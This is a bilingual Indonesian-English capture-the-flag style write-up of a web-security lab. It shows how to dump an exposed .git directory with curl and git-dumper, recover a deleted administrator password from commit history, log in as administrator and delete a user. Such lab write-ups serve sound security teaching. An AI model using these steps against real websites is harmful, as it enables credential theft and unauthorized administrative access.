# Lab: Information disclosure in version control history

**Category**: Information Disclosure / Version Control Exposure (`.git`)  
**Goal**: Mengunduh repositori `.git` yang terpapar publik, menganalisis riwayat *commit history* (`git log` & `git show`), menemukan password administrator yang dihapus pada commit terdahulu (`dypgu6iibb9fcb7fr50u`), lalu login sebagai `administrator` dan menghapus user `carlos`.  
*Extract sensitive info from an exposed `.git` directory, analyze commit history (`git log` & `git show`) to recover a removed administrator password (`dypgu6iibb9fcb7fr50u`), log in as `administrator`, and delete user `carlos`.*

---

## 📌 Overview & Prerequisite Knowledge / Gambaran Umum & Pengetahuan Dasar

- **Exposed `.git` Directory (Keterpaparan Folder `.git`)**: 
  Jika folder `.git` diunggah secara tidak sengaja ke web server publik tanpa pembatasan akses, siapapun dapat mengunduh struktur repositori tersebut untuk merekonstruksi *source code* dan riwayat *commit*.
  *If the `.git` folder is exposed publicly on a web server, attackers can reconstruct full source code and historical commits.*
- **Git Commit History Analysis**: 
  Meskipun kata sandi atau API key telah dihapus pada commit terbaru, informasi tersebut tetap tersimpan secara permanen di dalam riwayat commit terdahulu (*commit history diff*) kecuali riwayat Git dibersihkan (*purged*).
  *Even if hard-coded passwords are removed in recent commits, they persist permanently in historical commit diffs unless properly purged.*

---

## 🎯 Solution Summary / Ringkasan Solusi

1. **ID**: Verifikasi eksposure folder `.git` dengan mengunduh file `/.git/HEAD` (`ref: refs/heads/master`).  
   **EN**: Verify `.git` exposure by fetching `/.git/HEAD` (`ref: refs/heads/master`).
2. **ID**: Unduh seluruh struktur repositori `.git` menggunakan tools seperti `git-dumper` atau `wget -r`.  
   **EN**: Download the complete `.git` repository structure using `git-dumper` or `wget -r`.
3. **ID**: Jalankan `git log --oneline` untuk melihat riwayat commit, temukan commit terkait `Remove admin password from config` (misal hash `1acea74`).  
   **EN**: Run `git log --oneline` to review commit logs and locate `Remove admin password from config` (e.g. commit hash `1acea74`).
4. **ID**: Jalankan `git show 1acea74` untuk melihat *diff* dan mengekstrak password lama: `dypgu6iibb9fcb7fr50u`.  
   **EN**: Run `git show 1acea74` to view the commit diff and extract the removed password: `dypgu6iibb9fcb7fr50u`.
5. **ID**: Login ke halaman `/login` sebagai `administrator:dypgu6iibb9fcb7fr50u`, buka admin panel, lalu hapus user `carlos` untuk menyelesaikan lab.  
   **EN**: Log in at `/login` as `administrator:dypgu6iibb9fcb7fr50u`, open the admin panel, and delete user `carlos` to complete the lab.

![Solution Overview](../../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260805190530.png)

---

## 🛠️ Step-by-Step Guide / Panduan Langkah demi Langkah

### Step 1: Test Git Exposure via `/.git/HEAD` / Uji Akses `.git`

**ID**: Cek apakah direktori `.git` dapat diakses secara terbuka menggunakan `curl`:  
**EN**: Verify if the `.git` directory is publicly readable using `curl`:

```bash
curl -s https://0a46006b039794fe80fabc7f008100f9.web-security-academy.net/.git/HEAD
```

Output:
```text
ref: refs/heads/master
```

---

### Step 2: Download Exposed Git Repository / Unduh Repositori Git

**ID**: Gunakan `git-dumper` atau `wget -r` untuk mendownload seluruh objek Git ke folder lokal `./output`:  
**EN**: Use `git-dumper` or `wget -r` to dump the entire Git object tree to a local directory `./output`:

```bash
git-dumper https://0a46006b039794fe80fabc7f008100f9.web-security-academy.net/.git ./output
```

---

### Step 3: Analyze Git Commit Logs / Analisis Riwayat Commit

**ID**: Masuk ke folder `./output` lalu periksa log commit:  
**EN**: Navigate to `./output` and check the commit history:

```bash
cd ./output/
git log --oneline
```

Output:
```text
1acea74 (HEAD -> master) Remove admin password from config
170747d Add skeleton admin panel
```

> [!NOTE]
> Commit `1acea74` menunjukkan pesan: *"Remove admin password from config"*.

---

### Step 4: Inspect Commit Diff (`git show`) / Periksa Diff Commit untuk Password

**ID**: Periksa perubahan (*diff*) pada commit `1acea74` menggunakan `git show`:  
**EN**: Inspect the commit diff for `1acea74` using `git show`:

```bash
git show 1acea74
```

Output:
```diff
commit 1acea74af6593b9b6658a79312d1ac640b9eb0a0 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 3c36369..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=dypgu6iibb9fcb7fr50u
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

> [!NOTE]
> **Extracted Administrator Password**:  
> `dypgu6iibb9fcb7fr50u`

---

### Step 5: Login as Administrator & Delete Carlos / Login & Hapus User Carlos

**ID**: Buka halaman `/login` pada aplikasi web target, lalu masukkan kredensial berikut:  
**EN**: Open `/login` on the target application and authenticate with:

- **Username**: `administrator`
- **Password**: `dypgu6iibb9fcb7fr50u`

![Admin Account Dashboard](../../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260805195613.png)

Buka halaman **Admin panel**.

![Admin Panel Interface](../../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260805195714.png)

Klik **Delete** pada baris pengguna `carlos`.

![Lab Solved Confirmation](../../Image%20Asset/Source%20code%20disclosure/Pasted%20image%2020260805195808.png)

> [!SUCCESS]
> **Lab Solved**: User `carlos` berhasil dihapus dan lab diselesaikan!  
> *User `carlos` successfully deleted and lab solved!*